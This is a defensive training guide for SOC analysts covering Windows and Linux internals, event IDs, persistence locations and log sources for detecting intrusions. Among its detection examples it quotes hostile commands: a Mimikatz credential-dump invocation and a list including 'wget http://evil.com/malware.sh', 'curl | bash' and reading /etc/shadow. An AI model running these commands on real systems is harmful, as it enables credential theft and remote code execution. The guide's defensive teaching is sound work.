Operating Systems for SOC Analysts

Attackers exploit operating systems. To catch them, you need to understand how Windows and Linux work - not as a user, but as a defender. This guide shows you the internals through a security lens.

Critical Windows Components for Security

LSASS.EXE - THE CROWN JEWELS ═══════════════════════════════════════════════════════════════════════════════ What is LSASS? Local Security Authority Subsystem Service Handles all Windows authentication Why attackers LOVE it: When you log in, your credentials are cached in LSASS memory! ┌─────────────────────────────────────────────────────────────────────────┐ │ LSASS.exe Memory Contents │ │ │ │ User: john.doe │ │ NTLM Hash: aad3b435b51404eeaad3b435b51404ee:abc123... │ │ Kerberos Tickets: TGT for domain access │ │ Clear-text password: (sometimes, depending on config) │ │ │ │ 🎯 MIMIKATZ can dump all of this! │ └─────────────────────────────────────────────────────────────────────────┘ Attack flow: 1. Attacker gets code execution 2. Runs: mimikatz.exe "sekurlsa::logonpasswords" 3. Mimikatz reads LSASS memory 4. Dumps all credentials → Attacker owns the domain DETECTION: ───────────────────────────────────────────────────────────────────────────── EDR Alert: "LSASS memory access by non-system process" Sysmon Event 10: Process accessed lsass.exe If you see ANYTHING accessing LSASS that isn't a system process = INVESTIGATE!
THE WINDOWS REGISTRY - ATTACKER'S FAVORITE HIDING SPOT ═══════════════════════════════════════════════════════════════════════════════ What is it? A hierarchical database storing ALL Windows configuration Structure: HKEY_LOCAL_MACHINE (HKLM) ← System-wide settings HKEY_CURRENT_USER (HKCU) ← Current user settings HKEY_USERS (HKU) ← All user settings HKEY_CLASSES_ROOT (HKCR) ← File associations HKEY_CURRENT_CONFIG (HKCC) ← Hardware config PERSISTENCE LOCATIONS (Attackers put malware here): ═══════════════════════════════════════════════════════════════════════════════ RUN KEYS - Execute on every login: ───────────────────────────────────────────────────────────────────────────── HKLM\Software\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce Example malware entry: Name: "WindowsUpdate" Value: "C:\Users\Public\malware.exe" Every time user logs in → malware.exe runs! SERVICES - Run as background processes: ───────────────────────────────────────────────────────────────────────────── HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName] Attackers create fake services that look legitimate: "Windows Update Helper" → Actually runs malware DETECTION QUERIES: ───────────────────────────────────────────────────────────────────────────── Look for: • New entries in Run keys • Services with unusual paths (not in System32) • Base64 or encoded commands in registry values • Event ID 4657: Registry value modified • Sysmon Event 13: Registry value set

Windows Event Logs - Your Evidence Trail

WINDOWS SECURITY EVENTS - THE MOST IMPORTANT IDs ═══════════════════════════════════════════════════════════════════════════════ AUTHENTICATION EVENTS: ───────────────────────────────────────────────────────────────────────────── 4624 - SUCCESSFUL LOGON "Someone logged in" Key fields: • Logon Type (see below) • Source IP address • Account name • Workstation name Investigation: Who logged in, from where, what type? 4625 - FAILED LOGON "Someone tried and failed" Red flags: • Many 4625 then 4624 = brute force SUCCESS • Same password across users = password spray • 4625 to admin accounts from unknown IPs 4648 - EXPLICIT CREDENTIAL LOGON "Someone used credentials to authenticate" Red flags: • Indicates Pass-the-Hash or runas • If source ≠ normal workstation = lateral movement LOGON TYPES - MEMORIZE THESE: ───────────────────────────────────────────────────────────────────────────── Type 2 = Interactive (keyboard login) Type 3 = Network (SMB, file share, remote) ← Lateral movement! Type 4 = Batch (scheduled task) Type 5 = Service (service startup) Type 7 = Unlock (unlock screen) Type 10 = RemoteInteractive (RDP) ← Remote access! Type 11 = CachedInteractive (cached credentials) PROCESS EVENTS: ───────────────────────────────────────────────────────────────────────────── 4688 - PROCESS CREATED "A program ran" CRITICAL: Enable command line logging! Without it, you just see "powershell.exe" With it, you see "powershell.exe -enc [base64 payload]" Key fields: • Process name • Command line (if logging enabled) • Parent process • User who ran it PERSISTENCE EVENTS: ───────────────────────────────────────────────────────────────────────────── 4698 - SCHEDULED TASK CREATED Attackers use tasks for persistence Red flags: • Task running PowerShell or cmd • Task pointing to temp folders • Task created by non-admin user 7045 - SERVICE INSTALLED (System log) "New service was created" Red flags: • Service binary in unusual location • Service running as SYSTEM with odd name • Service created around time of compromise PRIVILEGE EVENTS: ───────────────────────────────────────────────────────────────────────────── 4672 - SPECIAL PRIVILEGES ASSIGNED "Admin logged in" Shows when privileged accounts are used Correlate with 4624 to see admin access patterns 4720 - USER ACCOUNT CREATED Red flag if: • Created by non-standard process • Created at unusual time • Name mimics legitimate account

🔴 Attack Detection Pattern

Brute Force Attack:

Look for: Multiple 4625 (failed) → Single 4624 (success) → 4672 (admin) from same source IP

Query logic: Count 4625 by source IP, if >5 in 5 minutes AND followed by 4624 = Alert!

Critical Windows Folders

WHERE ATTACKERS HIDE - FOLDER MAP ═══════════════════════════════════════════════════════════════════════════════ C:\Windows\System32\ ├── Legitimate OS files ├── 🎯 Attackers drop files here to blend in └── Look for: Files with recent modified dates, unusual names C:\Windows\Temp\ ├── Temporary files (anyone can write here) ├── 🎯 Malware LOVES this location └── Look for: Executables, scripts, recently created files C:\Users\[user]\AppData\ ├── Local\ (app data that doesn't roam) ├── LocalLow\ (low integrity apps) ├── Roaming\ (syncs with profile) ├── 🎯 Common malware drop location └── Look for: Hidden folders, executables, suspicious scripts C:\ProgramData\ ├── Shared application data ├── 🎯 Persistence location └── Look for: Unusual folders, startup items C:\Windows\Prefetch\ ├── Execution history! (.pf files) ├── 🎯 Forensic goldmine └── Shows: What ran and when (even if deleted) EXAMPLE INVESTIGATION: ───────────────────────────────────────────────────────────────────────────── Alert: "Suspicious PowerShell execution" Check these locations: 1. C:\Windows\Prefetch\ → Was malware.exe ever run? (MALWARE.EXE-ABC123.pf) 2. C:\Users\john\AppData\Local\Temp\ → Dropped files? 3. C:\Windows\Temp\ → Any executables created around incident time? 4. Registry Run keys → Did it establish persistence?

Linux Security Files

CRITICAL LINUX FILES - WHAT ATTACKERS TARGET ═══════════════════════════════════════════════════════════════════════════════ AUTHENTICATION FILES: ───────────────────────────────────────────────────────────────────────────── /etc/passwd - User accounts (readable by everyone) root:x:0:0:root:/root:/bin/bash john:x:1000:1000:John:/home/john:/bin/bash │ │ │ └── x means password is in /etc/shadow └──── UID (0 = root!) 🎯 Attackers: Add user with UID 0 = instant root access! Detection: Monitor for new entries, UID 0 accounts /etc/shadow - Password hashes (root only) root:$6$salt$hash...:18000:0:99999:7::: 🎯 Attackers: Dump and crack offline Detection: Any read access by non-root process /etc/sudoers - Who can become root john ALL=(ALL) NOPASSWD: ALL ← No password needed! 🎯 Attackers: Add entry for persistence Detection: File modification monitoring SSH FILES: ───────────────────────────────────────────────────────────────────────────── ~/.ssh/authorized_keys - Who can SSH in ssh-rsa AAAA...key... user@host 🎯 Attackers: Add their public key = permanent access Detection: New keys added, especially to root /etc/ssh/sshd_config - SSH server config PermitRootLogin yes ← Bad! PasswordAuthentication yes 🎯 Attackers: Enable root login, weaken security CRON (Scheduled Tasks): ───────────────────────────────────────────────────────────────────────────── /etc/crontab - System cron /etc/cron.d/* - System cron drop-in /var/spool/cron/crontabs/[user] - User crons * * * * * /tmp/malware.sh ← Runs every minute! 🎯 Attackers: Add cron job for persistence Detection: New cron entries, especially running from /tmp

Linux Logs

LINUX LOGS - WHERE TO LOOK ═══════════════════════════════════════════════════════════════════════════════ AUTHENTICATION: ───────────────────────────────────────────────────────────────────────────── /var/log/auth.log (Debian/Ubuntu) /var/log/secure (RHEL/CentOS) Jan 4 10:15:23 server sshd[1234]: Accepted password for john from 10.1.1.50 Jan 4 10:15:24 server sshd[1234]: Failed password for root from 185.220.101.34 Key patterns: • "Failed password" - failed login attempts • "Accepted password" - successful logins • "Invalid user" - username that doesn't exist • Multiple failures + success = brute force COMMAND HISTORY: ───────────────────────────────────────────────────────────────────────────── ~/.bash_history - Commands user ran 🎯 Attackers often: unset HISTFILE or rm ~/.bash_history Detection: Missing history file is suspicious! Common attack commands in history: • wget http://evil.com/malware.sh • curl | bash • chmod +x /tmp/* • cat /etc/shadow SYSTEM LOGS: ───────────────────────────────────────────────────────────────────────────── /var/log/syslog - General system log /var/log/messages - General messages /var/log/kern.log - Kernel messages Look for: • Kernel module loads (rootkits) • Out-of-memory killers (cryptominers) • Segfaults (exploit attempts)

🔍 Quick Linux Investigation Checklist

  • last - Who logged in recently?
  • w - Who's logged in now?
  • ps auxf - What's running?
  • netstat -tulpn - What's listening?
  • crontab -l - What's scheduled?
  • cat /etc/passwd - Any new users?
  • find /tmp -type f -executable - Executables in /tmp?
